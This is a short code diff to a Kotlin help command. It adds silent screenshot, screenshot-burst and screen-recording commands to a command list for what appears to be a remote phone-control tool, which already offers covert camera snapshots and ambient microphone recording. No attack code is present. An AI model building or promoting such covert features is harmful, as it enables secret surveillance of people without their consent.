@@ -36,6 +36,9 @@ class HelpCommand @Inject constructor() : Command {
 
             📸 <b>Forensics & Media</b>
             • <code>/snap front|back</code> — Covert snapshot
+            • <code>/screenshot</code> — Silent full-screen capture [PRO]
+            • <code>/screen_burst [5-10]</code> — Rapid 5–10 frame montage [PRO]
+            • <code>/screenrecord &lt;seconds&gt;</code> — MP4 video (Device Owner) [ENTERPRISE]
             • <code>/video front|back &lt;seconds&gt;</code> — Video recording (1-60s) [PRO]
             • <code>/record &lt;seconds&gt;</code> — Ambient microphone recording [PRO]
             • <code>/record stop</code> — Stop recording
